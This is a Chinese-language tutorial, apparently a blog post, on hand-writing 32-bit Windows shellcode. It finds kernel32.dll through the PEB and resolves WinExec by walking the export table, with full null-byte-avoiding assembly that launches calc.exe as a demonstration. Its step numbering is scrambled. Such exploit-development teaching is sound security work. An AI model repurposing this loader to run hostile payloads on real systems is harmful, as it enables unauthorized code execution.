Windows不能直接访问system call，需要调用Windows的底层API来对系统资源进行访问，常用的几个dll文件为ntdll.dll、kernel32.dll、advapi32.dll等，不过大部分我们可能会用到的api都在kernel32.dll和ntdll.dll中。


查找dll的基址


我们使用ListDlls来查看当前电脑中运行的所有的程序加载的所有dll地址，如下图所示。



会发现即使在开启了ASLR的情况下，每个程序的exe加载基址不同，但是每个程序中都会导入这两个dll文件，并且ntdll.dll和kernel32.dll等dll文件加载的基址是完全相同的。这是因为在windows系统中，这两个dll实际只会在系统中加载一次，然后其他的程序对该dll文件中的handle和指针进行引用，因此，当我们找到其他进程中该dll的地址，我们即可找到该dll以及其所包含的所有函数的绝对地址。


接下来，我们开始弹一个计算器吧。


查找DLL的绝对地址


一个不是很冷的冷知识：FS段寄存器中在3环下存放的为TEB，在0环下存放为KPCR。


TEB（Thread Environment Block,线程环境块），TEB中存放着线程的各种信息，每一个线程都有自己的TEB。(各结构体的详情见附录)


而TEB中0x30位置为Ptr32 _PEB，即指向PEB的指针。


PEB（Process Envirorment Block,进程环境块），PEB是存放进程信息的结构体。在PEB中0x0c的位置为Ptr32 _PEB_LDR_DATA，同样是一个指针，指向了进程加载的模块的信息的结构。


_PEB_LDR_DATA中在0x14处有一个双向链表InMemoryOrderModuleList，该双向列表存放着内存中按顺序加载的所有dll，从上面截图中可以发现，ntdll.dll是排在首位的dll，第二个即为kernel32.dll，因此我们找的时候沿着链表跳转两次即可得到kernel32.dll的_LDR_DATA_TABLE_ENTRY,然后从InMemoryOrderModuleList到DllBase的偏移为0x10，即指针地址+0x10即可找到kernel32加载的绝对地址。


汇编代码


xor esi, esi	          ; esi = 0
mov ebx, [fs:30h + esi]	  ; 找PEB
mov ebx, [ebx + 0x0C]     ; 找 PEB_LDR_DATA
mov ebx, [ebx + 0x14]     ; 找 InMemoryOrderModuleList
mov ebx, [ebx]		      ; 跳到Ntdll 
mov ebx, [ebx]		      ; 跳到kernel32.dll
mov ebx, [ebx + 0x10]     ; 找到kernel32的基址

查找相关函数的绝对地址


我们需要的调用计算器的函数为WinExec。然后我们找此函数的绝对地址。


根据PE的结构（PE的结构自己百度吧，有本书是专门介绍PE结构的）


  1. 找到E_lfanew的RVA地址（DllBase+0x3c）

  2. 找到PE文件签名地址（DllBase+1中保存的RVA）

  1. 找到导出表的RVA(2中得到的地址+0x78)

  2. 找到导出表的绝对地址（DllBase+3中的RVA）

  1. 找到导出函数的数量（4中地址+0x14）

  2. 找到导出地址表的RVA(4中地址+0x1c)

  1. 找到导出地址表的绝对地址（DllBase+6中RVA）

  2. 找到导出名称表的RVA(4中地址+0x20)

  1. 找出导出名称表的绝对地址（DllBase+8中的RVA）

  2. 找到导出序号表的RVA（4中地址+0x24）

  1. 找到导出序号表的绝对地址（DllBase+10中的RVA）

  2. 遍历名称表，找到WinExec并记住遍历过的数量。

  1. 在序号表在对应位置处找到WinExec并得到其序号（序号表的绝对地址+（12中的值*2））

  2. 在地址表里找到WinExec的RVA（地址表的绝对地址+（13中得到的序号*4））

  1. 找到WinExec的绝对地址（RVA+DllBase）

push ebp

; Find kernel32.dll base address
mov ebx, fs:0x30
mov ebx, [ebx + 0x0C] 
mov ebx, [ebx + 0x14] 
mov ebx, [ebx]	
mov ebx, [ebx]	
mov ebx, [ebx + 0x10]		; ebx holds kernel32.dll base address
mov [ebp-8], ebx 		; var8 = kernel32.dll base address

; Find WinExec address
mov eax, [ebx + 3Ch]		; RVA of PE signature
add eax, ebx       		; Address of PE signature = base address + RVA of PE signature
mov eax, [eax + 78h]		; RVA of Export Table
add eax, ebx 			; Address of Export Table

mov ecx, [eax + 24h]		; RVA of Ordinal Table
add ecx, ebx 			; Address of Ordinal Table
mov [ebp-0Ch], ecx 		; var12 = Address of Ordinal Table

mov edi, [eax + 20h] 		; RVA of Name Pointer Table
add edi, ebx 			; Address of Name Pointer Table
mov [ebp-10h], edi 		; var16 = Address of Name Pointer Table

mov edx, [eax + 1Ch] 		; RVA of Address Table
add edx, ebx 			; Address of Address Table
mov [ebp-14h], edx 		; var20 = Address of Address Table

mov edx, [eax + 14h] 		; Number of exported functions

xor eax, eax 			; counter = 0

.loop:
        mov edi, [ebp-10h] 	; edi = var16 = Address of Name Pointer Table
        mov esi, [ebp-4] 	; esi = var4 = "WinExec\x00"
        xor ecx, ecx

        cld  			; set DF=0 => process strings from left to right
        mov edi, [edi + eax*4]	; Entries in Name Pointer Table are 4 bytes long
        			; edi = RVA Nth entry = Address of Name Table * 4
        add edi, ebx       	; edi = address of string = base address + RVA Nth entry
        add cx, 8 		; Length of strings to compare (len('WinExec') = 8)
        repe cmpsb        	; Compare the first 8 bytes of strings in 
        			; esi and edi registers. ZF=1 if equal, ZF=0 if not
        jz start.found

        inc eax 		; counter++
        cmp eax, edx    	; check if last function is reached
        jb start.loop 		; if not the last -> loop

        add esp, 26h      		
        jmp start.end 		; if function is not found, jump to end

.found:
	; the counter (eax) now holds the position of WinExec

        mov ecx, [ebp-0Ch]	; ecx = var12 = Address of Ordinal Table
        mov edx, [ebp-14h]  	; edx = var20 = Address of Address Table

        mov ax, [ecx + eax*2] 	; ax = ordinal number = var12 + (counter * 2)
        mov eax, [edx + eax*4] 	; eax = RVA of function = var20 + (ordinal * 4)
        add eax, ebx 		; eax = address of WinExec = 
        			; = kernel32.dll base address + RVA of WinExec

.end:
	add esp, 26h		; clear the stack
	pop ebp
	ret

编写shellcode


format PE console
use32
entry start

  start:
        push eax ; Save all registers
        push ebx
        push ecx
        push edx
        push esi
        push edi
        push ebp

	; Establish a new stack frame
	push ebp
	mov ebp, esp

	sub esp, 18h 			; Allocate memory on stack for local variables

	; push the function name on the stack
    xor esi, esi
    pushw si	; Pushes only 2 bytes, thus changing the stack alignment to 2-byte boundary
    push 63h
    pushw 6578h	; Pushing another 2 bytes returns the stack to 4-byte alignment
    push 456e6957h
    mov [ebp-4], esp ; edx -> "WinExec\x00"

	; Find kernel32.dll base address
	xor esi, esi			; esi = 0
        mov ebx, [fs:30h + esi]  	; written this way to avoid null bytes
	mov ebx, [ebx + 0x0C] 
	mov ebx, [ebx + 0x14] 
	mov ebx, [ebx]	
	mov ebx, [ebx]	
	mov ebx, [ebx + 0x10]		; ebx holds kernel32.dll base address
	mov [ebp-8], ebx 		; var8 = kernel32.dll base address

	; Find WinExec address
	mov eax, [ebx + 3Ch]		; RVA of PE signature
	add eax, ebx       		; Address of PE signature = base address + RVA of PE signature
	mov eax, [eax + 78h]		; RVA of Export Table
	add eax, ebx 			; Address of Export Table

	mov ecx, [eax + 24h]		; RVA of Ordinal Table
	add ecx, ebx 			; Address of Ordinal Table
	mov [ebp-0Ch], ecx 		; var12 = Address of Ordinal Table

	mov edi, [eax + 20h] 		; RVA of Name Pointer Table
	add edi, ebx 			; Address of Name Pointer Table
	mov [ebp-10h], edi 		; var16 = Address of Name Pointer Table

	mov edx, [eax + 1Ch] 		; RVA of Address Table
	add edx, ebx 			; Address of Address Table
	mov [ebp-14h], edx 		; var20 = Address of Address Table

	mov edx, [eax + 14h] 		; Number of exported functions

	xor eax, eax 			; counter = 0

	.loop:
	        mov edi, [ebp-10h] 	; edi = var16 = Address of Name Pointer Table
	        mov esi, [ebp-4] 	; esi = var4 = "WinExec\x00"
	        xor ecx, ecx

	        cld  			; set DF=0 => process strings from left to right
	        mov edi, [edi + eax*4]	; Entries in Name Pointer Table are 4 bytes long
	        			; edi = RVA Nth entry = Address of Name Table * 4
	        add edi, ebx       	; edi = address of string = base address + RVA Nth entry
	        add cx, 8 		; Length of strings to compare (len('WinExec') = 8)
	        repe cmpsb        	; Compare the first 8 bytes of strings in 
	        			; esi and edi registers. ZF=1 if equal, ZF=0 if not
	        jz start.found

	        inc eax 		; counter++
	        cmp eax, edx    	; check if last function is reached
	        jb start.loop 		; if not the last -> loop

	        add esp, 26h      		
	        jmp start.end 		; if function is not found, jump to end

	.found:
		; the counter (eax) now holds the position of WinExec

	        mov ecx, [ebp-0Ch]	; ecx = var12 = Address of Ordinal Table
	        mov edx, [ebp-14h]  	; edx = var20 = Address of Address Table

	        mov ax, [ecx + eax*2] 	; ax = ordinal number = var12 + (counter * 2)
	        mov eax, [edx + eax*4] 	; eax = RVA of function = var20 + (ordinal * 4)
	        add eax, ebx 		; eax = address of WinExec = 
	        			; = kernel32.dll base address + RVA of WinExec

	        xor edx, edx
		push edx		; null termination
		push 6578652eh
		push 636c6163h
		push 5c32336dh
		push 65747379h
		push 535c7377h
		push 6f646e69h
		push 575c3a43h
		mov esi, esp		; esi -> "C:\Windows\System32\calc.exe"

		push 10  		; window state SW_SHOWDEFAULT
		push esi 		; "C:\Windows\System32\calc.exe"
		call eax 		; WinExec

		add esp, 46h		; clear the stack

	.end:
		
		pop ebp 		; restore all registers and exit
		pop edi
		pop esi
		pop edx
		pop ecx
		pop ebx
		pop eax
		ret
